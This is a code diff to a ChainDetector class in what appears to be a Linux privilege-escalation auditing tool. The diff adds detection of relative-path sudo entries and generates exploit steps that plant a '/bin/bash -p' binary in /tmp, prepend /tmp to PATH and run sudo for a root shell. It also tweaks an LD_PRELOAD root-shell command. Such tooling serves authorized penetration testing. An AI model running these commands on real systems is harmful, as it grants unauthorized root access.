@@ -84,7 +84,7 @@ class ChainDetector:
                         chains.append(chain)
             except (AttributeError, TypeError) as e:
                 # Skip detectors that don't apply to this result type
-                logging.getLogger(__name__).debug(f"Chain detector {detector.__name__} skipped: {e}")
+                logging.getLogger(__name__).debug("Chain detector %s skipped: %s", detector.__name__, e)
                 continue
 
         return chains
@@ -584,7 +584,7 @@ class ChainDetector:
                             order=3,
                             description="Execute with LD_PRELOAD",
                             commands=[
-                                f"sudo LD_PRELOAD=/tmp/preload.so {sudo.commands[0] if sudo.commands else 'program'}"
+                                f"sudo LD_PRELOAD=/tmp/preload.so {sudo.commands[0] if sudo.commands else getattr(sudo, 'raw_line', 'program')}"
                             ],
                             output="Root shell"
                         )
@@ -729,11 +729,41 @@ class ChainDetector:
         return chains if chains else None
 
     def _detect_sudo_path_injection(self, results) -> AttackChain | None:
-        """Detect sudo without secure_path."""
-        getattr(results, 'sudo_rights', [])
+        """Detect sudo without secure_path or relative-path sudo commands."""
+        sudo_rights = getattr(results, 'sudo_rights', [])
 
-        # This requires checking if sudo uses secure_path
-        # Usually detected in LinPEAS output
+        # Check for sudo entries that use relative paths (no leading /)
+        # These are vulnerable to PATH hijacking
+        for sudo in sudo_rights:
+            for cmd in getattr(sudo, 'commands', []):
+                cmd = cmd.strip()
+                if cmd and cmd not in ('ALL', 'NOPASSWD') and not cmd.startswith('/') and not cmd.startswith('!'):
+                    return AttackChain(
+                        name="Sudo PATH Injection",
+                        description=f"sudo entry uses relative command '{cmd}' - PATH injection possible",
+                        steps=[
+                            ChainStep(
+                                order=1,
+                                description="Create malicious binary shadowing the relative command",
+                                commands=[
+                                    f"echo '/bin/bash -p' > /tmp/{cmd}",
+                                    f"chmod +x /tmp/{cmd}",
+                                    "export PATH=/tmp:$PATH"
+                                ]
+                            ),
+                            ChainStep(
+                                order=2,
+                                description="Execute via sudo to get root shell",
+                                commands=[f"sudo {cmd}"]
+                            )
+                        ],
+                        confidence=Confidence.HIGH,
+                        risk=Risk.LOW,
+                        reliability_score=80,
+                        complexity_score=20
+                    )
+
+        # Also check if sudo uses secure_path via raw sections
         raw = getattr(results, 'raw_sections', {})
 
         secure_path_disabled = False
